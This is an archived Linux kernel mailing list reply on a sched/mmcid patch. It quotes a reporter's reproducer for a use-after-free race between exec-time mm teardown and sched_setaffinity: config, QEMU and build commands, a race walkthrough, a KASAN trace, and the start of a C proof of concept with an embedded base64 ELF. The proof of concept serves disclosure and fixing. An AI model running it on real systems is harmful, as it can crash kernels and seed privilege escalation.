Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 4269A606A339
	for <linux-mm@archiver.kernel.org>; Tue, 10 Nov 2026 18:46:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=efficios.com header.i=@efficios.com header.a=rsa-sha256 header.s=selector1 header.b=RTfyOWbH
Received: by kanga.kvack.org (Postfix)
	id 5D4FF6B05C9; Tue, 10 Nov 2026 13:46:09 -0500 (EST)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id 58A3D6B05CA; Tue, 10 Nov 2026 13:46:09 -0500 (EST)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id 44D046B05CB; Tue, 10 Nov 2026 13:46:09 -0500 (EST)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0016.hostedemail.com [216.40.44.16])
	by kanga.kvack.org (Postfix) with ESMTP id 1D6E86B05C9
	for <linux-mm@kvack.org>; Tue, 10 Nov 2026 13:46:09 -0500 (EST)
Received: from smtpin09.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay08.hostedemail.com (Postfix) with ESMTP id A9915140A48
	for <linux-mm@kvack.org>; Tue, 10 Nov 2026 18:46:08 +0000 (UTC)
X-FDA: 85420089216.09.0313806
Received: from YT3PR01CU008.outbound.protection.outlook.com (mail-canadacentralazon11020097.outbound.protection.outlook.com [52.101.189.97])
	by imf09.hostedemail.com (Postfix) with ESMTP id C46D814000C
	for <linux-mm@kvack.org>; Tue, 10 Nov 2026 18:46:05 +0000 (UTC)
Authentication-Results: imf09.hostedemail.com;
	dkim=pass header.d=efficios.com header.s=selector1 header.b=RTfyOWbH;
	spf=pass (imf09.hostedemail.com: domain of mathieu.desnoyers@efficios.com designates 52.101.189.97 as permitted sender) smtp.mailfrom=mathieu.desnoyers@efficios.com;
	dmarc=pass (policy=none) header.from=efficios.com;
	arc=pass ("microsoft.com:s=arcselector10001:i=1")
ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1794336366;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references:dkim-signature;
	bh=sjtKoBMTWRyGWNFGcXgP7c9DZnJ47VUpBebKuQCOsXg=;
	b=MC8lxAsce6uBUi+NFHxrfl4glfXnM8FQwT/tu0ZQqX4Kj9Kn5aefqq2BxPdOyQpv1A167Z
	fUxN49aD27pxiHg2BhXkzWf1Ebvp0j/FN0GFDpiFQcZsPKNy33QrtdDcnGBc3r35kXgutl
	WIa1OVx6o0nSdbbHwnRmdYvM5ZFDcFs=
ARC-Seal: i=2; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=pass;
	t=1794336366;
	b=ISpMCfxfW0LpOSMgRpu2po6B9PjWHhbkQZdfabv8YlunKdncL4OAZG4ugjltYyjw/9Z0/7
	1bV5ed0XK7bfDTcmuX3vHGY3CRbQsmqnIlWwGttoQCyDO6RnieUkeRi6pTuzY6RtKV8KWP
	JrE1vEEFCbT1ITJVOtAyPv+vU2/S0EY=
ARC-Authentication-Results: i=2;
	imf09.hostedemail.com;
	dkim=pass header.d=efficios.com header.s=selector1 header.b=RTfyOWbH;
	spf=pass (imf09.hostedemail.com: domain of mathieu.desnoyers@efficios.com designates 52.101.189.97 as permitted sender) smtp.mailfrom=mathieu.desnoyers@efficios.com;
	dmarc=pass (policy=none) header.from=efficios.com;
	arc=pass ("microsoft.com:s=arcselector10001:i=1")
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=tlXKWGmCYyIfi5/zltFOAhELhPwNdcpNMv/30xzgTCtV8Of59PRtM2ATGwxm7aX2aXMVC38RYUj5x7GdFNFzmXxNr7n808Ml3svmsxDrQQ+YeinBIbii0M6uwNyFxn4iNgZYL30xwSWCZD9TJJqO1z1f3qa+mIIJQyNyjTZpNYnnjfzDl0LaSaYItaaKNQ+NHZYWiX2X2xiPkZLLRmgg5bPvK7/dgRU8PtHvMLIqZdeyT4GyB6eyc1q/VSSD3qey2sfTQWG8O5oMJAC4b6+ghSPUFYoW7pA0TofFO8nGB/NdEFrnGr+erv+0762WqsvOXhlMFaWMJ1keKRR1IYUT1Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=sjtKoBMTWRyGWNFGcXgP7c9DZnJ47VUpBebKuQCOsXg=;
 b=l9S3yFdDKrZDKUfR/wl5TZXK1qlm9V1/H2PAkwk4uqZBV9AVek/visKNnuT0gsNjPHleNhIEjDNyAWUQV2Rq4Md5J6XXRWf4bc319C/m6mn/3wr4DQPWn3zfa483gOmKjsC5f5jkHe4aS9dmA4K/CTOtcAABLaShTm7QrflBNL3oWdRoBjZ70eLUJMernMtXxXRaKrgaj3A8Mf1mHpO11eiO5YJNs0zwE51NOrLFZFhzonU8YTXIA94ALc3fWEo6JtkS0a8RKmaItJbUjbR5q+xHA6OTI9/rnEaOXH/rndXScRsvd9hAWZXd3vB+w4T0q00gaYeh15TwMkfIT8RYSg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=efficios.com; dmarc=pass action=none header.from=efficios.com;
 dkim=pass header.d=efficios.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=efficios.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=sjtKoBMTWRyGWNFGcXgP7c9DZnJ47VUpBebKuQCOsXg=;
 b=RTfyOWbHGUCalR6Ogp0A3DeE2dI/iXeS5LmIuMYqGQVR1No9JFJws6dIqaJyC5BLRqB1pfMjGePdCRtNOZ/opfl0XR0kbLB6XZYFAVY8ZliXxyAVMN25SImECoFj9KjrVIRh12dRGFE/iPpRjr8W3YZBJRGHCRiZnEAFQqbo0nLJD7L9yUHty2mQ56hR8zMsTuDZTPmNWjei15i/+S7L5nQOi4wyN+zpkeVGnXBPJE7FPliFMbQESu5CAC4nttRq4D2+Jx4DMKMp/KwH5gF1dbuHWJ8DTTcRpRgQYi2FOznGpP5n3wVc6YqQYunZiuApjQ21y7X0ZBcYxXZIjrQ3eQ==
Received: from YT6PR01MB491026.CANPRD01.PROD.OUTLOOK.COM
 (2603:10b6:b01:1d0::10) by YT2PR01MB9523.CANPRD01.PROD.OUTLOOK.COM
 (2603:10b6:b01:af::19) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.615.8; Tue, 10 Nov
 2026 18:46:01 +0000
Received: from YT6PR01MB491026.CANPRD01.PROD.OUTLOOK.COM
 ([fe80::6b9e:a901:67c5:7ddc]) by YT6PR01MB491026.CANPRD01.PROD.OUTLOOK.COM
 ([fe80::6b9e:a901:67c5:7ddc%6]) with mapi id 15.21.0615.007; Tue, 10 Nov 2026
 18:46:01 +0000
Message-ID: <3d4c5808-dff4-4d5d-aab3-684eb8a9139b@efficios.com>
Date: Tue, 10 Nov 2026 13:46:00 -0500
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3] sched/mmcid: Synchronize MM teardown with affinity
 updates
To: Weiming Shi <bestswngs@gmail.com>, Kees Cook <kees@kernel.org>,
 Alexander Viro <viro@zeniv.linux.org.uk>,
 Christian Brauner <brauner@kernel.org>, Jan Kara <jack@suse.cz>,
 Ingo Molnar <mingo@redhat.com>, Peter Zijlstra <peterz@infradead.org>,
 Juri Lelli <juri.lelli@redhat.com>,
 Vincent Guittot <vincent.guittot@linaro.org>,
 Dietmar Eggemann <dietmar.eggemann@arm.com>,
 Steven Rostedt <rostedt@goodmis.org>, Ben Segall <bsegall@google.com>,
 Mel Gorman <mgorman@suse.de>, Valentin Schneider <vschneid@redhat.com>,
 K Prateek Nayak <kprateek.nayak@amd.com>, Thomas Gleixner <tglx@kernel.org>
Cc: linux-mm@kvack.org, linux-fsdevel@vger.kernel.org,
 linux-kernel@vger.kernel.org, Xiang Mei <xmei5@asu.edu>
References: <20261110183809.3308868-1-bestswngs@gmail.com>
 <20261110183809.3308868-2-bestswngs@gmail.com>
From: Mathieu Desnoyers <mathieu.desnoyers@efficios.com>
Content-Language: en-US
In-Reply-To: <20261110183809.3308868-2-bestswngs@gmail.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: YT4PR01CA0416.CANPRD01.PROD.OUTLOOK.COM
 (2603:10b6:b01:10b::15) To YT6PR01MB491026.CANPRD01.PROD.OUTLOOK.COM
 (2603:10b6:b01:1d0::10)
X-Archived-By: <archiver.kernel.org>
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: YT6PR01MB491026:EE_|YT2PR01MB9523:EE_
X-MS-Office365-Filtering-Correlation-Id: c89f3500-ae1e-43d8-2962-08df3f5ade27
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam:
	BCL:0;ARA:13230040|1800799024|366016|376014|7416014|23010399003|18002099003|22082099003|6133799003|10067099003|4133799003|921020|4143699003|261009223027099003|261028144727099003|261026140227099003|261102123227099003|261021135927099003|261021121427099003|261022105027099003|56012099006|261021123027099003|261022113327099003|261022075727099003|261026121527099003|261022115727099003;
X-Microsoft-Antispam-Message-Info:
	FgiJ5RObItjgVsr4SkjgeMfCmENqppHuI8zyXdWlLN2zHcThraYnETKa/OBzfI/p+nzdbj+JDfnAK69OBSHiPbQH+5g4CP+y5TiAigesnXF2IOePn4oxSRB+LAn7oQ/HSiKeGfcHNosPDTcVMGWFIIJovFqnVcyJYX0EjgZ2GFrBbkFFfoe84IFLzdaFY/kjBlF3RDHUjEcuqacVVtCIFnzpaIb5xL7+dYFMB8RkX4UOnTMWmsozMAivjprdhuGmTEEW1dNBrtDEwmi8+sK7SNEpWd6ln3kY3RD3guCrzrIjglHCMdiQsquTz8vUG9tsufnzYuc/P2penJlpkHsnHt7nRh7hI9OQk1voqfZn2QEHo2upVAA0SwbIHgbEK2BqGggtyzsghbM6OnvN8nsvewmLZbJxSPwm2kEUxw/m6zhyuv+hawzT/ZMc8B2P6ns9v4Erg/hLmJkJ+wJkFT4qY1iatRXrTTI4OTdOc7iqyH60rzM05phNI2UVy2iyYWGYmTo7lskRRkRMFo5WryTqR8Rn46NSuCiAtEufxgXY1uW5OUQj3MXhgDrWsBuwB8tDUL2ChU1R7usATY7ebtJabxGcqXk9lfmawzgm4MY/UPUPW8wFkBrweKvZQdcRJHJ5s1l+Wx0EqhnRDAASPMplNw==
X-Forefront-Antispam-Report:
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:YT6PR01MB491026.CANPRD01.PROD.OUTLOOK.COM;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(366016)(376014)(7416014)(23010399003)(18002099003)(22082099003)(6133799003)(10067099003)(4133799003)(921020)(4143699003)(261009223027099003)(261028144727099003)(261026140227099003)(261102123227099003)(261021135927099003)(261021121427099003)(261022105027099003)(56012099006)(261021123027099003)(261022113327099003)(261022075727099003)(261026121527099003)(261022115727099003);DIR:OUT;SFP:1102;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0:
	=?utf-8?B?M240SDFsTGR0T1NJbEd0S3BBUmxCNTNJM3g5WDg5Y3c0WDBuRE9vMUtNNVlP?=
 =?utf-8?B?aFpIOUhOMnJTcW1zbkM0S2xnTEpvUnh4RUZqK2dXMDIrMHRoSXd5eThKQ2VS?=
 =?utf-8?B?a3pQYzRoWjhrNjNFLzV2eFBjVW1jOG1iSmo2SU1zZUFOUkFQVDgraW9XU3kv?=
 =?utf-8?B?NzNMVU1LbGxaQUpGUU5tWW1YZjRpRmVSbFJ1TTlaOUJTMVNjYXZ3eEFrdk8y?=
 =?utf-8?B?eVJyYko5VHlST0dka0wxOUlyOU9vUEtsUlFYWFRyWExvSy91clZYMHErSlJR?=
 =?utf-8?B?MlZyOHY4MkQ3Tm1uRVVyeEZmTkJhTXpwa291MHplVGJESmhsYUZXOFhKSWRE?=
 =?utf-8?B?RnNSUnFNd28wd3BFVVYwTlowY0VaL1RJSGJNdTBGL0ZRY2RnQUJoNms3TUFi?=
 =?utf-8?B?R2tDVzdNaXVqYWJSWHlVeFNTOWt2WHdYQk1uV0RtUExFUG95cXJmN1l4NEww?=
 =?utf-8?B?SUMvc3NHRVNndE5yTzhQVnFZeEI1MUJ6WG9DRytnVmxjdUpiZkQwSkJ0dXEy?=
 =?utf-8?B?dHFKcCsvbjltRnA2cm02aVpmVVFaSzV5Wm9QQmVlWnJMMGR5ME5lM0FxZEhE?=
 =?utf-8?B?QXowUGdMUFlldDgvOG9LdEhCb3ordDErakl2a0R3WGo4c1NTMHBCd00zTEMx?=
 =?utf-8?B?SHhRdUxXRzc4ckZEUUd3V21sb0dVSXAvM0NDM0NKNHF4NFEzVjNuMkZidnpU?=
 =?utf-8?B?QitNbExTSWlpYTBOVm5IQWFYZ2QySEZKemZxRzhxZFByMHhMMnRYSXdkMllo?=
 =?utf-8?B?R1hwbXRYanNxWW9DQXpBMzdna1BPK2gwTkc5THVBL28wK1NMUmlyWXBOdUo4?=
 =?utf-8?B?N29ienl1K1Q1eldrUEdNQXVpc1pKUHEvQ3VKbVdtYmx6K1ZEYnUvTkNxQkJG?=
 =?utf-8?B?ZVJTZzBJNzFoNHRYVDNjSXA1dFpCdzArV2dwcDZtL1ZROFlpYmRNTm5EcFlV?=
 =?utf-8?B?VjM4MmpxTDVMaG5hWkFyNnVxb1Ivb3BLTGRpT1I5MDJ5WWZvUW9tZGpsdHp5?=
 =?utf-8?B?QllUZWhSZW9JYXgrSzdMbFFHc09TY1RnVmxRcG9LZjhmbituYWZwSERjenN1?=
 =?utf-8?B?MURGY0x0REhoRGd3RmV0Z3V4emdFQUJ2VW41VVlFQzFkS3dIZ1c3UUtHdXdK?=
 =?utf-8?B?eXZQTmtrVThxWHZReE5tN0w4cm5UdDlSODNzSmlXek9BU2RiaWxjRFYwSEtO?=
 =?utf-8?B?YXpnTytPYTVWZUlPY1ovV21rcWUwRGZ4TVJsenN0MFRKbzllNkRJdktSbnhC?=
 =?utf-8?B?NjZZb0NnMXhnb25VNW5wUXp0ZlpNUzRteTNMNnlhQ2xxdFRUdzMvT0NXdGJv?=
 =?utf-8?B?Si96TXFmc3dKVkRWMnBHd09iY1VUS0ZmZWNJVHgzSG5RQkVwRkNteUdLOW5y?=
 =?utf-8?B?OElGVnJzZUgzMEo3cHAwa1hHQWg1ZHQ5cUo2cVN0eFhBRHpmdzB2c0FVTW5E?=
 =?utf-8?B?NWw5WTJGZVNObDVYczZabEJnZEVGZEFuKzRIVGJKeWEyN0YzRFJ0SzNTVTRY?=
 =?utf-8?B?NlZySHVoOGxkSHBQb3oxY0s1Rm5LejBhaXdTZitScFhjOFM1REoxUDRFbWpp?=
 =?utf-8?B?bWd5aWV4Slp5dGRENm90VDY4a01lV0I1OWpWTVJqZ0FKcG5JSUhzMy9JeE1m?=
 =?utf-8?B?aE9hWk1jamlzb2dIMkp3UEJ3b3czdDBtUm1GYTM3Kzc4Yjd2eWRMZjFlY0hp?=
 =?utf-8?B?VVk0dENpMlFpUWZDRzhoTXQvdjVYU20vcGkxUG5LVEd4WCt0OUZaV3BOSnNY?=
 =?utf-8?B?U1A3T2VCWC9ONERrMU5mTVA3OHFzbW1lZzI4YWRONGFyakR1RktUbjRmRFR6?=
 =?utf-8?B?bUZJQS9seWdhNGpQMDRteHYwT2paZU9Sb0ZBbmVML0lqd0RDQllyWE9MNE40?=
 =?utf-8?B?UU1lbUt4b2JUNHZVbVQzMkp6eU5KQWVUQnNKVHdvT2NkZ2dITFY3STJwci9m?=
 =?utf-8?B?SEh6ZzVGWW5adXhYMnhqOFhUUERrSksxZlhaUzdVbEdKRG5McDd1MWlQK1NV?=
 =?utf-8?B?em80eGZ0aGVuWjhrWkRSeWhxcVpWR2FrSHBQTXdYQzE0YVpOUDh6bHIwLzcw?=
 =?utf-8?B?b3FCdmZOQ2V6eGZhUDg3MVlwa1ZxcTMrdlpwa01wcWZTVGc5UG1aMWVXRnhr?=
 =?utf-8?B?L3V3U0dmZCtKdk9FaDVYanJxTTZOU21NYkZVbW1JMHhzWTFvNk1ta3RzR3Rt?=
 =?utf-8?B?WG50ZEFXNWZuMEpNQWh0Sm1UUkxNT2NpM0w3SE5JUFBCN0NtVnBlYW53Sytq?=
 =?utf-8?B?bXpOUkYyNDg4eGtGQ2JERnRGamVaTGIzUVBiWXQ4V2VyUW9oSHBHUlJlZ1JF?=
 =?utf-8?B?RXVJMmtPaVlrN2Z2em1rZVRPa0lwNU90VWNHTWxLelpwbjFFa0szTFg0TXYx?=
 =?utf-8?Q?LtSnzM7RgKzb12PYys0RNXtNKkzbBmAoQXVql?=
X-OriginatorOrg: efficios.com
X-MS-Exchange-CrossTenant-Network-Message-Id: c89f3500-ae1e-43d8-2962-08df3f5ade27
X-MS-Exchange-CrossTenant-AuthSource: YT6PR01MB491026.CANPRD01.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 10 Nov 2026 18:46:01.7675
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4f278736-4ab6-415c-957e-1f55336bd31e
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: /6NW1HhoRrcAEsDysWtTn4kuOEdVAdLCAycEP+Ih55iTbX9gnUEZsSOdTTgPKsyxJ/Un+77bipFoBr68t0q9wNrOvoAVzsT3/sPzy81q6qo=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: YT2PR01MB9523
X-Rspamd-Server: rspam06
X-Stat-Signature: skx3sskh4ujkufmnapg9rc3zkk9xtsia
X-Spam-Status: No, score=-4.3 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,LOTS_OF_MONEY,
	MAILING_LIST_MULTI,SPF_HELO_PASS,SPF_PASS,USER_AGENT_SANE_1
	autolearn=no autolearn_force=no version=4.0.1
X-Rspamd-Queue-Id: C46D814000C
X-Rspam-User: 
X-HE-Tag: 1794336365-172769
X-HE-Meta: U2FsdGVkX1/4H33/qEUpxm9nWpeeDcjFhLDxB7Z6lBLdJE+YGpE4fWoiPvBT+hFartR8P+4mpkphU8z0RQ66WLbK9KdXj4l0vs/oP4eHqhx2Uyb7h7PGwgl6ZtFNmHmh2yXvcLOBq511zQBob7HPktlSb8KhqAjofKLus2kKJ7r7AGEkf66RrBmizMtHkeh8FzuwKArA1HbQpkMrqvQ2eaVLXfsUgEkY56euRqjMxDYs06FTbdDU9kCcgx+oUPFRCZV3On9f84DXNHqUxmvlf2o2/YY6hNFiHu9XTlH5A52VqD/mQ/9goTX09A3qxTsfMwuQav8ZRb5gWDDbkHnMFMsuOEJPCxcbSajUJmfGuX32KSZgJaQ7g8x8BDxXCNlCngq+IWCd/PP0XFFH0NTGaabKdH8lBw57uZumdN7Gmll59Qhxk5sCU/rNe1FrVY93LZl7OvY5H0WB6J5MqPTIop13eboX17UoniCJfT/IVDJIAHyRSOYNyXuDOs2oLKHG+VjsX7yYo4LcVtNGKnAAxJKFEVa0hWkIOi3gXFBVuvKQw0SKvZfNB76FsLtv58KhKJxZAiuHQ/RGir2gASZnXxG/WoZwMfBkon50dBVf/TtSL7swHtyBrtsR6PsRkSIC1HEK60fcZCZEnN2D135iR+vLiO9atEGwJcrrk9D1x+TUacMvNJhHBzV9ITntBhDONqlvtrJ1z/HImJSJ3zAv15XvANFg3p+wJjMAX+tly2XtXmzCGPPzHNG+T18j9o8mwgUySl63hRBDFrJophibSpmnKPJBPbemM7zezc7baeNZA9A5VXTc8eIzo4Qb6havCD9944f66e01RTNI4YjgqHGUAesHXqnqoJlufr7RYr9B9yviYoHl0A1i/iLhBqKvtdXOtnkCZSAymA1hiEnVBj9r0C5T8VKhtMQ7eTMYRHqNiWAjjnLtURPnk92UO7kjIRlh0ZhxtOyB1i1CSZT
 P/31bKvO
 tirAzd8Q+NeuY0SBJfjfv4iM/Rvqeh8UrG6+pN5Bp0CXKW6dWm+S5FGmE6IgMLFcU4FkIwmenlUcfb7Dvhrz4X47eA8kzng8BygdCSCplpkxpgvssVLwSYgQ+rGwOx1kL0Pr4mAnf92Q9d9rPy4nndcaLVqyAGUh3Nki7TQ+BHyrvy1QuO2asZ8mZxgwgyPDJ2qaTvfnD58J4V/2taNPJbYPj+Nc2fo0ItiB9LKVypUXPH0HeuazwAISYGiQZhaWA4pWk5UVzoBAjLkxiKg7LA6lJi/ayqA6eqZpKHws5erdFCp8abuh6ED3eHWNSltSUxZ5m/e827zyDW/5YgS+JugJeDESbDeZiGLbC880On7x0sL68WJ7kGxAm1g5ZcyfkWrEIscoFCc0J2+sy9v7LgA8PLCq5lyUAKG6w3gg0F3D+o+I5iVyYLXB3px64kfHR8Z/19H0mNWswifO6plbjgg1R6Kxe0Atyha0HudQLufZv0q6B0LVCI2KArg==
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
X-Spam-Checker-Version: SpamAssassin 4.0.1 (2024-03-26) on
	aws-us-west-2-korg-listserv-alma10-1

+CC tglx.

On 2026-11-10 13:38, Weiming Shi wrote:
> Hi,
> 
> Here is a standalone reproducer for the p->mm lifetime race.
> 
> The tested kernel was commit 05441d697f7f9a927264f4058cbbc6a03dfcac9d
> with:
> 
> ```
> CONFIG_SMP=y
> CONFIG_EXPERT=y
> # CONFIG_FUTEX is not set
> CONFIG_RSEQ=y
> CONFIG_SCHED_MM_CID=y
> CONFIG_KASAN=y
> CONFIG_KASAN_GENERIC=y
> CONFIG_KASAN_INLINE=y
> CONFIG_DEBUG_INFO=y
> ```
> 
> KASAN and DEBUG_INFO produce and decode the report. The vulnerable path
> requires CONFIG_SCHED_MM_CID=y. This exec manifestation also requires
> CONFIG_FUTEX=n because futex_exec_done() otherwise serializes old-MM teardown
> with the p->pi_lock held by the affinity updater.
> 
> Dependencies and scheduling setup:
> 
> - x86-64 Linux guest with at least four online CPUs;
> - gcc and glibc in the guest to build the PoC;
> - sched_setaffinity(), memfd_create(), and execveat() available;
> - eight guest vCPUs scheduled on four host CPUs for the tested 2:1 overcommit;
> - UID/GID 65534 for the tested run.
> 
> Host command:
> 
> ```
> taskset -c 0-3 qemu-system-x86_64 \
>      -accel kvm -machine q35 -cpu max -m 8G -smp 8 \
>      -kernel bzImage -initrd initramfs.cpio.gz \
>      -append "console=ttyS0 rdinit=/init nokaslr panic_on_warn=1 panic=-1" \
>      -nographic -no-reboot
> ```
> 
> Build and run inside the guest:
> 
> ```
> gcc -O3 -Wall -Wextra -o poc poc.c
> ./poc 180
> ```
> 
> The reproducer works as follows:
> 
> 1. It decodes an embedded 848-byte ET_EXEC image into a memfd.
> 2. The victim initially pins itself to the penultimate guest CPU. The setters
>     then alternate its affinity between that CPU alone and the last two guest
>     CPUs while it repeatedly executes the memfd with execveat(AT_EMPTY_PATH).
> 3. Up to six same-UID setter processes run on the other CPUs and alternate the
>     victim between one- and two-CPU affinity masks.
> 4. A 31-us periodic userspace SIGALRM provides interrupt pressure.
> 5. Host CFS overcommit can deschedule a setter after it loads the
>     victim's old p->mm. The victim can then complete setup_new_exec() and free
>     that old mm before the setter reaches mm_update_cpus_allowed().
> 
> The PoC counts syscall attempts, successful affinity updates, errors, and
> completed victim execs separately. Every ten-second window must contain both
> a successful affinity update and victim exec progress. It checks for an early
> victim or setter exit, and a clean result requires successful child statuses.
> 
> This is a stochastic race. The progress-checking version reported the UAF
> after about 52.60 seconds. The last completed ten-second window before the
> crash recorded 2,096,128 successful affinity updates, zero errors, and 18,975
> completed execs:
> 
> ```
> BUG: KASAN: slab-use-after-free in set_cpus_allowed_common
> Read of size 4 at addr ffff888123155e4c by task poc/5132
> CPU: 4 UID: 65534 PID: 5132 Comm: poc
> 
> Call Trace:
>   set_cpus_allowed_common             kernel/sched/core.c:10835
>   set_cpus_allowed_fair               kernel/sched/fair.c:10046
>   __set_cpus_allowed_ptr_locked       kernel/sched/core.c:3224
>   __set_cpus_allowed_ptr              kernel/sched/core.c:3258
>   __sched_setaffinity                 kernel/sched/syscalls.c:1161
>   sched_setaffinity                   kernel/sched/syscalls.c:1239
>   __x64_sys_sched_setaffinity         kernel/sched/syscalls.c:1275
>   do_syscall_64                       arch/x86/entry/syscall_64.c:84
>   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
> 
> Freed by task 5127:
>   kmem_cache_free                     mm/slub.c:6757
>   __mmput                             kernel/fork.c:1204
>   mmput                               kernel/fork.c:1215
>   setup_new_exec                      fs/exec.c:1395
>   load_elf_binary                     fs/binfmt_elf.c:1024
>   bprm_execve                         fs/exec.c:1865
>   do_execveat_common.isra.0           fs/exec.c:1963
>   __x64_sys_execveat                  fs/exec.c:2047
>   do_syscall_64                       arch/x86/entry/syscall_64.c:84
>   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
> ```
> 
> Complete PoC:
> 
> ```c
> /*
>   * Standalone reproducer for the sched/mmcid p->mm UAF.
>   *
>   * Build: gcc -O3 -o poc poc.c
>   * Run:   taskset -c 0-3 qemu-system-x86_64 ... -smp 8 ...
>   * Guest: ./poc [seconds]
>   *
>   * The tiny self-exec victim is embedded below and executed from memfd.  The
>   * tested VM used CONFIG_SCHED_MM_CID=y, CONFIG_FUTEX=n and 2:1 vCPU
>   * overcommit (8 vCPUs on 4 host CPUs).
>   */
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <poll.h>
> #include <sched.h>
> #include <signal.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/eventfd.h>
> #include <sys/mman.h>
> #include <sys/prctl.h>
> #include <sys/stat.h>
> #include <sys/syscall.h>
> #include <sys/time.h>
> #include <sys/types.h>
> #include <sys/wait.h>
> #include <time.h>
> #include <unistd.h>
> 
> #define DEFAULT_RUNTIME 180
> #define MAX_SETTERS 6
> #define READY_FD 3
> #define VICTIM_FD 4
> #define VICTIM_SIZE 848
> 
> /* 848-byte ET_EXEC produced from victim_min_execfd.S + victim_min.ld. */
> static const char victim_b64[] =
> "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAsABAAAAAAABAAAAAAAAAABACAAAAAAAAAAAAAEAAOAAC"
> "AEAABQAEAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAOAEAAAAAAAA4AQAAAAAAAAAQ"
> "AAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAA"
> "AAAAAABJieS4AQAAAL8DAAAASI01VAAAALoIAAAADwVIg/gIdTlMiedIgecAAOD/vgAAQAC4CwAA"
> "AA8FuEIBAAC/BAAAAEiNNSgAAABIjRUpAAAARTHSQbgAEAAADwW4PAAAAL9/AAAADwX0kAEAAAAA"
> "AAAAAAAAAAAAAAAgAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA"
> "8f8AAAAAAAAAAAAAAAAAAAAACgAAAAAAAQAYAUAAAAAAAAAAAAAAAAAADgAAAAAAAQAgAUAAAAAA"
> "AAAAAAAAAAAAFAAAAAAAAQAoAUAAAAAAAAAAAAAAAAAAGQAAABIAAQCwAEAAAAAAAGcAAAAAAAAA"
> "AHZpY3RpbS5vAG9uZQBlbXB0eQBhcmd2AF9zdGFydAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRh"
> "YgAuaW1hZ2UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
> "AAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABwAAAAAAAACwAEAAAAAAALAAAAAAAAAAiAAA"
> "AAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAA4AQAA"
> "AAAAAJAAAAAAAAAAAwAAAAUAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAA"
> "AAAAyAEAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAA"
> "AAAAAAAAAAAAAOgBAAAAAAAAIgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=";
> 
> struct setter_stats {
> 	volatile unsigned long long attempts;
> 	volatile unsigned long long successes;
> 	volatile unsigned long long errors;
> };
> 
> struct shared_state {
> 	struct setter_stats setters[MAX_SETTERS];
> };
> 
> static int b64_value(unsigned char c)
> {
